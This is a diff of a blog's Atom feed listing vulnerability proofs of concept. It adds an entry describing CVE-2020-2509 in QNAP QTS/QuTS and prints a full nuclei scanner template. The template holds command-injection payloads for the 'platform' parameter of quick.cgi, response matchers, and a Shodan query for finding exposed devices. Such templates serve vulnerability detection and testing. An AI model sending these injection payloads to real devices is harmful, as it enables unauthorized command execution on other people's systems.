@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2025-06-23T18:00:10.412Z</updated>
+  <updated>2025-06-23T18:15:15.297Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -15,6 +15,32 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>QNAP QTS / QuTS 通过平台参数认证的远程代码执行漏洞</title>
+    <link href="http://example.com/2025/06/23/github_128506685/"/>
+    <id>http://example.com/2025/06/23/github_128506685/</id>
+    <published>2025-06-23T18:15:15.303Z</published>
+    <updated>2025-06-23T18:15:15.297Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> QNAP QTS &#x2F; QuTS 通过平台参数认证的远程代码执行漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2020-2509</li></ul><p><strong>漏洞类型：</strong> 命令执行</p><p><strong>漏洞等级：</strong> 严重</p><p><strong>漏洞描述：</strong> QNAP QTS和QuTS包含一个通过认证的命令注入漏洞（CVE-2020-2509）。此模板通过<code>platform</code>参数执行操作系统命令，包括多个注入向量、WAF绕过和用于响应验证的提取器。</p><p><strong>产品厂商：</strong> QNAP</p><p><strong>产品名称：</strong> QNAP QTS &#x2F; QuTS</p><p><strong>搜索语法：</strong> http.title:”QNAP Turbo NAS”</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/blob/7f264cac0e1169d87b765cf07023431f73e1035a/http%2Fcves%2F2020%2Fcve-2020-2509-qnap-rce-advanced.yaml">https://github.com/projectdiscovery/nuclei-templates/blob/7f264cac0e1169d87b765cf07023431f73e1035a/http%2Fcves%2F2020%2Fcve-2020-2509-qnap-rce-advanced.yaml</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs nix"><br><span class="hljs-params">id:</span> cve-<span class="hljs-number">202</span>0-<span class="hljs-number">250</span>9-qnap-rce-advanced<br><br><span class="hljs-params">info:</span><br>  <span class="hljs-params">name:</span> QNAP QTS <span class="hljs-symbol">/</span> QuTS <span class="hljs-operator">-</span> Authenticated RCE via platform Parameter (CVE-<span class="hljs-number">202</span>0-<span class="hljs-number">2509</span>)<br>  <span class="hljs-params">author:</span> malek838<br>  <span class="hljs-params">severity:</span> critical<br>  <span class="hljs-params">description:</span> |<br>    QNAP QTS and QuTS contain an authenticated command injection vulnerability (CVE-<span class="hljs-number">202</span>0-<span class="hljs-number">2509</span>). This template executes OS commands via the `platform` parameter. It includes multiple injection vectors, WAF bypasses, and extractors for response validation.<br>  <span class="hljs-params">reference:</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//vulncheck.com/xdb/533b5e83b1eb</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//github.com/jbaines-r7/overkill</span><br>  <span class="hljs-params">classification:</span><br>    <span class="hljs-params">cve-id:</span> CVE-<span class="hljs-number">202</span>0-<span class="hljs-number">2509</span><br>    <span class="hljs-params">cwe-id:</span> CWE-<span class="hljs-number">77</span><br>  <span class="hljs-params">tags:</span> cve,cve2020,rce,qnap,command-injection,waf-bypass<br>  <span class="hljs-params">metadata:</span><br>    <span class="hljs-params">shodan-query:</span> http.title:<span class="hljs-string">&quot;QNAP Turbo NAS&quot;</span><br>    <span class="hljs-params">verified:</span> <span class="hljs-literal">true</span><br><br><span class="hljs-params">http:</span><br>  <span class="hljs-operator">-</span> <span class="hljs-params">method:</span> POST<br>    <span class="hljs-params">path:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-string">&quot;&#123;&#123;BaseURL&#125;&#125;/cgi-bin/quick/quick.cgi&quot;</span><br><br>    <span class="hljs-params">headers:</span><br>      <span class="hljs-params">Content-Type:</span> application<span class="hljs-symbol">/x-www-form-urlencoded</span><br><br>    <span class="hljs-params">attack:</span> pitchfork<br>    <span class="hljs-params">body:</span> <span class="hljs-string">&quot;todo=reboot&amp;platform=&#123;&#123;cmd&#125;&#125;&quot;</span><br><br>    <span class="hljs-params">payloads:</span><br>      <span class="hljs-params">cmd:</span><br>        <span class="hljs-operator">-</span> <span class="hljs-string">&quot;;id&quot;</span><br>        <span class="hljs-operator">-</span> <span class="hljs-string">&quot;|id&quot;</span><br>        <span class="hljs-operator">-</span> <span class="hljs-string">&quot;`id`&quot;</span><br>        <span class="hljs-operator">-</span> <span class="hljs-string">&quot;$(id)&quot;</span><br>        <span class="hljs-operator">-</span> <span class="hljs-string">&quot;||id&quot;</span><br>        <span class="hljs-operator">-</span> <span class="hljs-string">&quot;;id;&quot;</span><br><br>    <span class="hljs-params">matchers:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> word<br>        <span class="hljs-params">part:</span> body<br>        <span class="hljs-params">words:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;uid=&quot;</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;gid=&quot;</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> regex<br>        <span class="hljs-params">part:</span> body<br>        <span class="hljs-params">regex:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;uid=<span class="hljs-char escape_">\\</span>d+<span class="hljs-char escape_">\\</span>([a-zA-Z]+<span class="hljs-char escape_">\\</span>)&quot;</span><br><br>    <span class="hljs-params">extractors:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> regex<br>        <span class="hljs-params">part:</span> body<br>        <span class="hljs-params">regex:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;uid=.*?gid=.*&quot;</span><br><br></code></pre></td></tr></table></figure>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; QNAP QTS &amp;#x2F; QuTS 通过平台参数认证的远程代码执行漏洞&lt;</summary>
+      
+    
+    
+    
+    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
+    
+    
+    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
+    
+    <category term="命令执行" scheme="http://example.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
+    
+  </entry>
   
   <entry>
     <title>Multiple Brother Devices Multiple Vulnerabilities (FIXED)</title>
@@ -512,33 +538,6 @@
     <category term="命令执行" scheme="http://example.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
     
     <category term="CVE-2025:github search" scheme="http://example.com/tags/CVE-2025-github-search/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>cve_2024_32002_hook</title>
-    <link href="http://example.com/2025/06/23/github_690835660/"/>
-    <id>http://example.com/2025/06/23/github_690835660/</id>
-    <published>2025-06-23T06:15:27.342Z</published>
-    <updated>2025-06-23T06:15:27.339Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> cve_2024_32002_hook</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2024-32002</li></ul><p><strong>漏洞类型：</strong> 其他</p><p><strong>漏洞描述：</strong> 展示CVE-2024-32002漏洞利用的仓库</p><p><strong>来源：</strong> <a href="https://github.com/O-Carneiro/cve_2024_32002_hook">https://github.com/O-Carneiro/cve_2024_32002_hook</a></p><p><strong>类型：</strong> CVE-2024:github search</p><h1 id="仓库文件"><a href="#仓库文件" class="headerlink" title="仓库文件"></a>仓库文件</h1><ul><li>kon</li></ul><h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; cve_2024_32002_hook&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;漏洞编号</summary>
-      
-    
-    
-    
-    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
-    
-    
-    <category term="CVE-2024:github search" scheme="http://example.com/tags/CVE-2024-github-search/"/>
-    
-    <category term="其他" scheme="http://example.com/tags/%E5%85%B6%E4%BB%96/"/>
     
   </entry>
   
